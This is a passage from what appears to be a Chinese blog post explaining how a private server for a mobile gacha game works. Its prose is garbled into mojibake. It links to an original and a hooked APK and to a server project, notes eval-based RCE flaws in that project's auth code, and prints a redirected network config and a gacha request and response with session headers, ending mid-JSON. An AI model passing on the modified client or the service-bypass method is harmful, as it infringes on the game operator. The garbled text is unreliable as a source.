ä¸­çš„å˜é‡Javasciptä¸­ï¼Œåªæœ‰ä¸€ç§ç»“æ„ï¼Œå¯¹è±¡(object)ï¼Œæ¯ä¸ªå®ä¾‹å¯¹è±¡(object)éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§(__proto__)å±‚å±‚å‘ä¸Š","link":"/2023/02/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E6%9C%89%E6%84%9F/"},{"title":"æŸæ¸¸ç§æœåŸç†","text":"å£°æ˜: æ­¤æ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµã€‚version 1.7.51[æ¾„é—ªç‰ˆæœ¬]Apkæ–‡ä»¶:https://pan.baidu.com/s/1Fe0J85AyrRiQxOdMa9dEdgæå–ç :lgm9 æœåŠ¡ç«¯:https://github.com/Darknights-dev/Darknights-serverè­¦å‘Š:ä»£ç é‡Œé¢æœ‰å¥½å‡ å¤„RCEæ¼æ´ï¼Œè°¨æ…éƒ¨ç½²æˆ‘å®¡å‡ºæ¥äº†ï¼Œå˜»å˜» åœ¨core/auth.pyï¼Œé‡Œé¢åˆ°å¤„éƒ½æ˜¯evalï¼Œå¾ˆæ€€ç–‘ä½œè€…çš„ç”¨å¿ƒï¼Œæ˜æ˜ä¼šjson.loadsï¼Œä½†æ˜¯éå¾—ç”¨eval è¿™é‡Œæˆ‘æŠŠåŸç‰ˆçš„apkå’Œhookè¿‡çš„apkéƒ½æ”¾åœ¨è¿™é‡Œäº†ï¼Œè¿™ä¸ªé¡¹ç›®å·²ç»å­˜åœ¨ä¸€å¹´å¤šäº†ï¼Œæ‰€ä»¥å®Œæˆåº¦éƒ½å¾ˆé«˜ï¼Œæ‰€æœ‰çš„äº¤äº’éƒ½è¢«ä¿®æ”¹æˆäº†httpè¯·æ±‚ï¼Œå› æ­¤å¯ä»¥å¾ˆè½»æ¾åœ°çœ‹åˆ°è¯¥æ¸¸æˆçš„å®ç°åŸç†ã€‚ æ¸¸æˆåœ¨åŠ è½½ä¹‹å‰ä¼šé¦–å…ˆè·å–ç½‘ç»œé…ç½®ï¼Œæ­¤æ—¶æœåŠ¡ç«¯ä¼šä¸‹å‘å¯¹åº”çš„æ¥å£çš„åœ°å€ 1{&quot;sign&quot;:&quot;liOYRfqui44FAHTZ3SoXtHJgl4Vj8vu90aumePes3Kh1A1Z4QVLCXtlG5h0EzfXsTKmdaBJjBaDkAaoR/BUt1JA+SdLIEzyb6BNjbgL5whdH8EQABSo/M5fYFn8QRjSbtQNl5tUK0cYJgCT3ODVnEmHKFqydrkjCPgVNyXU4Eyg=&quot;,&quot;content&quot;:&quot;{\\&quot;configVer\\&quot;:\\&quot;5\\&quot;,\\&quot;funcVer\\&quot;:\\&quot;V025\\&quot;,\\&quot;configs\\&quot;:{\\&quot;V025\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;as\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660\\&quot;,\\&quot;u8\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;http://xxx.xxx.xxx.xxx:38660/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}},\\&quot;V026\\&quot;:{\\&quot;override\\&quot;:true,\\&quot;network\\&quot;:{\\&quot;gs\\&quot;:\\&quot;https://ak-gs-gf.hypergryph.com\\&quot;,\\&quot;as\\&quot;:\\&quot;https://as.hypergryph.com\\&quot;,\\&quot;u8\\&quot;:\\&quot;https://as.hypergryph.com/u8\\&quot;,\\&quot;hu\\&quot;:\\&quot;https://ak.hycdn.cn/assetbundle/official\\&quot;,\\&quot;hv\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/{0}/version\\&quot;,\\&quot;rc\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/official/remote_config\\&quot;,\\&quot;an\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/announcement.meta.json\\&quot;,\\&quot;prean\\&quot;:\\&quot;https://ak-conf.hypergryph.com/config/prod/announce_meta/{0}/preannouncement.meta.json\\&quot;,\\&quot;sl\\&quot;:\\&quot;https://ak.hypergryph.com/protocol/service\\&quot;,\\&quot;of\\&quot;:\\&quot;https://ak.hypergryph.com/index.html\\&quot;,\\&quot;pkgAd\\&quot;:\\&quot;https://ak.hypergryph.com/download\\&quot;,\\&quot;pkgIOS\\&quot;:\\&quot;https://apps.apple.com/cn/app/id1454663939\\&quot;,\\&quot;secure\\&quot;:\\&quot;false\\&quot;}}}}&quot;} å®¢æˆ·ç«¯åœ¨æ”¶åˆ°æœåŠ¡ç«¯ä¸‹å‘çš„é…ç½®æ–‡ä»¶ä¹‹åï¼Œä¼šé¦–å…ˆè¿›è¡Œä¸€ä¸ªéªŒè¯(æ­¤å¤„ç›¸å…³å†…å®¹æˆ‘åé¢ä¼šè¯´æ˜) åç»­ä¸æœåŠ¡å™¨é€šä¿¡éƒ½ä¼šä¾æ®è¿™ä¸ªé…ç½®æ–‡ä»¶é‡Œå„ä¸ªæ¥å£çš„é“¾æ¥ï¼ŒæŠ½å¡ï¼Œæ‰“å…³å¡ï¼Œbalabalaçš„ æ¯”å¦‚æŠ½å¡: 12345678910111213POST /gacha/syncNormalGacha HTTP/1.1uid: 10000069secret: 94b594b06a45764c467f5d0b09a8eb52X-Unity-Version: 2017.4.39f1seqnum: 4Content-Type: application/jsonUser-Agent: Dalvik/2.1.0 (Linux; U; Android 11; M2105K81AC Build/RKQ1.200826.002)Host: xxx.xxx.xxx.xxx:38660Connection: closeAccept-Encoding: gzip, deflateContent-Length: 2{} 1234567HTTP/1.1 200 Content-Type: application/jsonDate: Tue, 24 Jan 2023 14:15:37 GMTConnection: closeContent-Length: 11524{&quot;result&quot;:0,&quot;charGet&quot;:{&quot;charInstId&quot;:15,&quot;charId&quot;:&quot;char_120_hibisc&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},&quot;gachaResultList&quot;:[{&quot;charInstId&quot;:6,&quot;charId&quot;:&quot;char_212_ansel&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:7,&quot;charId&quot;:&quot;char_209_ardign&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:8,&quot;charId&quot;:&quot;char_199_yak&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:9,&quot;charId&quot;:&quot;char_281_popka&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:10,&quot;charId&quot;:&quot;char_150_snakek&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:11,&quot;charId&quot;:&quot;char_236_rope&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:12,&quot;charId&quot;:&quot;char_133_mm&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:13,&quot;charId&quot;:&quot;char_278_orchid&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:14,&quot;charId&quot;:&quot;char_219_meteo&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]},{&quot;charInstId&quot;:15,&quot;charId&quot;:&quot;char_120_hibisc&quot;,&quot;isNew&quot;:1,&quot;itemGet&quot;:[{&quot;type&quot;:&quot;HGG_SHD&quot;,&quot;id&quot;:&quot;4004&quot;,&quot;count&quot;:1}]}],&quot;playerDataDelta&quot;:{&quot;deleted&quot;:{},&quot;modified&quot;:{&quot;troop&quot;:{&quot;curCharInstId&quot;:1,&quot;curSquadCount&quot;:4,&quot;charMission&quot;:{&quot;char_263_skadi&quot;:{&quot;mission_char_263_skadi_1&quot;:2,&quot;mission_char_263_skadi_0&quot;:2},&quot;char_1013_chen2&quot;:{&quot;mission_char_1013_chen2_1&quot;:2,&quot;mission_char_1013_chen2_0&quot;:2},&quot;char_1012_skadi2&quot;:{&quot;mission_char_1012_skadi2_0&quot;:2,&quot;mission_char_1012_skadi2_1&quot;:2},&quot;char_010_chen&quot;:{&quot;mission_char_010_chen_1&quot;:2,&quot;mission_char_010_chen_0&quot;:2},&quot;char_148_nearl&quot;:{&quot;mission_char_148_nearl_1&quot;:2,&quot;mission_char_148_nearl_0&quot;:2},&quot;char_1011_lava2&quot;:{&quot;mission_char_1011_lava2_1&quot;:2,&quot;mission_char_1011_lava2_0&quot;:2},&quot;char_121_lava&quot;:{&quot;mission_char_121_lava_1&quot;:2,&quot;mission_char_121_lava_0&quot;:2},&quot;char_1014_nearl2&quot;:{&quot;mission_char_1014_nearl2_0&quot;:2,&quot;mission_char_1014_nearl2_1&quot;:2}},&quot;addon&quot;:{},&quot;squads&quot;:{&quot;0&quot;:{&quot;slots&quot;:[{&quot;charInstId&quot;:1,&quot;skillIndex&quot;:0},{&quot;charInstId&quot;:2,&quot;skillIndex&quot;:-1},{&quot;charInstId&quot;:3,&quot;skillIndex&quot;:-1},{&quot;charInstId&quot;:4,&quot;skillIndex&quot;:-1},{&quot;charInstId&quot;:5,&quot;skillIndex&quot;:0},null,null,null,null,null,null,null],&quot;name&quot;:&quot;ç¬¬ä¸€ç¼–é˜Ÿ&quot;,&quot;squadId&quot;:&quot;0&quot;},&quot;1&quot;:{&quot;slots&quot;:[null,null,null,null,null,null,null,null,null,null,null,null],&quot;name&quot;:&quot;ç¬¬äºŒç¼–é˜Ÿ&quot;,&quot;squadId&quot;:&quot;1&quot;},&quot;2&quot;:{&quot;slots&quot;:[null,null,null,null,null,null,null,null,null,null,null,null],&quot;name&quot;:&quot;ç¬¬ä¸‰ç¼–é˜Ÿ&quot;,&quot;squadId&quot;:&quot;2&quot;},&quot;3&quot;:{&quot;slots&quot;:[null,null,null,null,null,null,null,null,null,null,null,null],&quot;name&quot;:&quot;ç¬¬å››ç¼–é˜Ÿ&quot;,&quot;squadId&quot;:&quot;3&quot;}},&quot;charGroup&quot;:{&quot;char_503_rang&quot;:{&quot;favorPoint&quot;:6},&quot;char_236_rope&quot;:{&quot;favorPoint&quot;:0},&quot;char_209_ardign&quot;:{&quot;favorPoint&quot;:0},&quot;char_120_hibisc&quot;:{&quot;favorPoint&quot;:0},&quot;char_212_ansel&quot;:{&quot;favorPoint&quot;:0},&quot;char_278_orchid&quot;:{&quot;favorPoint&quot;:0},&quot;char_150_snakek&quot;:{&quot;favorPoint&quot;:0},&quot;char_110_deepcl&quot;:{&quot;favorPoint&quot;:6},&quot;char_502_nblade&quot;:{&quot;favorPoint&quot;:6},&quot;char_500_noirc&quot;:{&quot;favorPoint&quot;:0},&quot;char_199_yak&quot;:{&quot;favorPoint&quot;:0},&quot;char_219_meteo&quot;:{&quot;favorPoint&quot;:0},&quot;char_133_mm&quot;:{&quot;favorPoint&quot;:0},&quot;char_281_popka&quot;:{&quot;favorPoint&quot;:0},&quot;char_002_amiya&quot;:{&quot;favorPoint&quot;:6}},&quot;chars&quot;:{&quot;11&quot;:{&quot;instId&quot;:11,&quot;charId&quot;:&quot;char_236_rope&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_236_rope#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_rope_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_rope_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;12&quot;:{&quot;instId&quot;:12,&quot;charId&quot;:&quot;char_133_mm&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_133_mm#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_mm_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_mm_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;13&quot;:{&quot;instId&quot;:13,&quot;charId&quot;:&quot;char_278_orchid&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_278_orchid#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_quickattack[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;14&quot;:{&quot;instId&quot;:14,&quot;charId&quot;:&quot;char_219_meteo&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_219_meteo#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_meteo_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_meteo_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;15&quot;:{&quot;instId&quot;:15,&quot;charId&quot;:&quot;char_120_hibisc&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_120_hibisc#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_heal_up[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;1&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_002_amiya&quot;,&quot;skin&quot;:&quot;char_002_amiya#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skcom_magic_rage[3]&quot;,&quot;unlock&quot;:1,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0},{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_amiya_2&quot;,&quot;unlock&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0},{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_amiya_3&quot;,&quot;unlock&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0}],&quot;instId&quot;:1,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:0,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;2&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_502_nblade&quot;,&quot;skin&quot;:&quot;char_502_nblade#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[],&quot;instId&quot;:2,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:-1,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;3&quot;:{&quot;favorPoint&quot;:0,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_500_noirc&quot;,&quot;skin&quot;:&quot;char_500_noirc#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[],&quot;instId&quot;:3,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:-1,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;4&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_503_rang&quot;,&quot;skin&quot;:&quot;char_503_rang#1&quot;,&quot;currentEquip&quot;:null,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[],&quot;instId&quot;:4,&quot;equip&quot;:{},&quot;gainTime&quot;:1633063253,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:-1,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;5&quot;:{&quot;favorPoint&quot;:6,&quot;level&quot;:1,&quot;charId&quot;:&quot;char_110_deepcl&quot;,&quot;skin&quot;:&quot;char_110_deepcl#1&quot;,&quot;currentEquip&quot;:&quot;uniequip_001_deepcl&quot;,&quot;voiceLan&quot;:&quot;JP&quot;,&quot;evolvePhase&quot;:0,&quot;skills&quot;:[{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_deepcl_1&quot;,&quot;unlock&quot;:1,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0},{&quot;specializeLevel&quot;:0,&quot;skillId&quot;:&quot;skchr_deepcl_2&quot;,&quot;unlock&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;state&quot;:0}],&quot;instId&quot;:5,&quot;equip&quot;:{&quot;uniequip_001_deepcl&quot;:{&quot;hide&quot;:0,&quot;level&quot;:1,&quot;locked&quot;:0},&quot;uniequip_002_deepcl&quot;:{&quot;hide&quot;:0,&quot;level&quot;:1,&quot;locked&quot;:0}},&quot;gainTime&quot;:1674569468,&quot;mainSkillLvl&quot;:1,&quot;defaultSkillIndex&quot;:0,&quot;potentialRank&quot;:0,&quot;exp&quot;:0},&quot;6&quot;:{&quot;instId&quot;:6,&quot;charId&quot;:&quot;char_212_ansel&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_212_ansel#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_range_extend&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;7&quot;:{&quot;instId&quot;:7,&quot;charId&quot;:&quot;char_209_ardign&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_209_ardign#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_heal_self[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;8&quot;:{&quot;instId&quot;:8,&quot;charId&quot;:&quot;char_199_yak&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_199_yak#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skchr_yak_1&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_yak_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;9&quot;:{&quot;instId&quot;:9,&quot;charId&quot;:&quot;char_281_popka&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_281_popka#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_atk_up[1]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null},&quot;10&quot;:{&quot;instId&quot;:10,&quot;charId&quot;:&quot;char_150_snakek&quot;,&quot;favorPoint&quot;:0,&quot;potentialRank&quot;:0,&quot;mainSkillLvl&quot;:1,&quot;skin&quot;:&quot;char_150_snakek#1&quot;,&quot;level&quot;:1,&quot;exp&quot;:0,&quot;evolvePhase&quot;:0,&quot;gainTime&quot;:1674569737,&quot;skills&quot;:[{&quot;skillId&quot;:&quot;skcom_def_up[2]&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:1},{&quot;skillId&quot;:&quot;skchr_snakek_2&quot;,&quot;state&quot;:0,&quot;specializeLevel&quot;:0,&quot;completeUpgradeTime&quot;:-1,&quot;unlock&quot;:0}],&quot;voiceLan&quot;:&quot;JP&quot;,&quot;defaultSkillIndex&quot;:0,&quot;currentEquip&quot;:null}}},&quot;consumable&quot;:{},&quot;status&quot;:{&quot;monthlySubscriptionStartTime&quot;:0,&quot;monthlySubscriptionEndTime&quot;:0,&quot;instantFinishTicket&quot;:0,&quot;secretarySkinId&quot;:&quot;char_002_amiya#1&quot;,&quot;flags&quot;:{&quot;obt/guide/l2-8/0_fstar_level&quot;:1,&quot;obt/main/level_main_00-01_beg&quot;:1,&quot;obt/guide/bd/meeting_intro&quot;:1,&quot;obt/guide/shop/2_social&quot;:1,&quot;obt/guide/l1-2/0_upgrade_char_again&quot;:1,&quot;obt/guide/l0-1/1_training_level&quot;:1,&quot;obt/guide/l0-0/1_recruit_adv&quot;:1,&quot;obt/guide/bd/trade_lv3&quot;:1,&quot;obt/guide/bd/drone_accel&quot;:1,&quot;obt/guide/bd/dorm_intro&quot;:1,&quot;obt/guide/l0-11/1a_slot_clean&quot;:1,&quot;firstTradingRoom&quot;:1,&quot;obt/guide/bd/hr_intro&quot;:1,&quot;obt/guide/l0-11/1b_slot_clean&quot;:1,&quot;obt/guide/l1-5/0_campaign_stage&quot;:1,&quot;obt/guide/l0-11/3c_station_trade&quot;:1,&quot;obt/guide/shop/0_main_and_extraqc&quot;:1,&quot;obt/guide/bd/drone_exchange&quot;:1,&quot;init&quot;:1,&quot;obt/guide/l0-0/0_home_ui&quot;:1,&quot;obt/guide/l0-11/1c_slot_clean&quot;:1,&quot;obt/guide/l0-11/3a_station_manu&quot;:1,&quot;obt/guide/l2-3/0_weekly_evolve&quot;:1,&quot;obt/guide/l0-11/2a_build_elect&quot;:1,&quot;activities/act13side/guide/guide_act13side_mission_2&quot;:1,&quot;activities/act13side/guide/guide_act13side_mission_1&quot;:1,&quot;obt/guide/l0-11/2b_build_manu&quot;:1,&quot;obt/guide/l0-11/0_building_init&quot;:1,&quot;obt/guide/l0-11/3d_op_trade&quot;:1,&quot;obt/guide/bd/workshop_op&quot;:1,&quot;obt/guide/l0-1/0_mission_main&quot;:1,&quot;obt/guide/shop/1_furni&quot;:1,&quot;obt/guide/l0-11/1d_slot_clean&quot;:1,&quot;obt/main/level_main_00-01_end&quot;:1,&quot;obt/guide/l0-0/3_battle_ui&quot;:1,&quot;obt/guide/l0-11/2c_build_trade&quot;:1,&quot;obt/guide/l0-11/3b_op_manu&quot;:1,&quot;obt/guide/bd/control_intro&quot;:1,&quot;obt/guide/misc/assist_char&quot;:1,&quot;obt/guide/l0-0/2_make_squad&quot;:1},&quot;registerTs&quot;:1674569257,&quot;serverName&quot;:&quot;æ³°æ‹‰&quot;,&quot;gold&quot;:10072,&quot;uid&quot;:10000069,&quot;avatarId&quot;:&quot;0&quot;,&quot;secretary&quot;:&quot;char_002_amiya&quot;,&quot;tenGachaTicket&quot;:0,&quot;mainStageProgress&quot;:&quot;tr_01&quot;,&quot;lggShard&quot;:0,&quot;iosDiamond&quot;:259084234,&quot;practiceTicket&quot;:30,&quot;hggShard&quot;:11,&quot;apLimitUpFlag&quot;:0,&quot;exp&quot;:72,&quot;maxAp&quot;:84,&quot;friendNumLimit&quot;:15,&quot;resume&quot;:&quot;è¿™ä¸ªäººå¾ˆæ‡’ï¼Œç›®å‰è¿˜æ²¡æœ‰ç­¾å~&quot;,&quot;nickNumber&quot;:&quot;0001&quot;,&quot;lastRefreshTs&quot;:1644919200,&quot;lastOnlineTs&quot;:1674569721,&quot;level&quot;:1,&quot;nickName&quot;:&quot;1&quot;,&quot;lastApAddTime&quot;:1674569257,&quot;socialPoint&quot;:0,&quot;tipMonthlyCardExpireTs&quot;:0,&quot;avatar&quot;:{},&quot;gachaCount&quot;:11,&quot;ap&quot;:78,&quot;recruitLicense&quot;:5,&quot;buyApRemainTimes&quot;:10,&quot;diamondShard&quot;:609479736,&quot;androidDiamond&quot;:259084234,&quot;progress&quot;:900,&quot;gachaTicket&quot;:0},&quot;inventory&quot;:{&quot;p_char_236_rope&quot;:0,&quot;p_char_110_deepcl&quot;:0,&quot;act13side_prestige_commerce&quot;:50,&quot;p_char_133_mm&quot;:0,&quot;2001&quot;:33,&quot;p_char_281_popka&quot;:0,&quot;p_char_120_hibisc&quot;:0,&quot;30061&quot;:1,&quot;p_char_278_orchid&quot;:0,&quot;p_char_219_meteo&quot;:0,&quot;act13side_prestige_kazimierz&quot;:50,&quot;30031&quot;:1,&quot;3301&quot;:10,&quot;2002&quot;:15,&quot;p_char_150_snakek&quot;:0,&quot;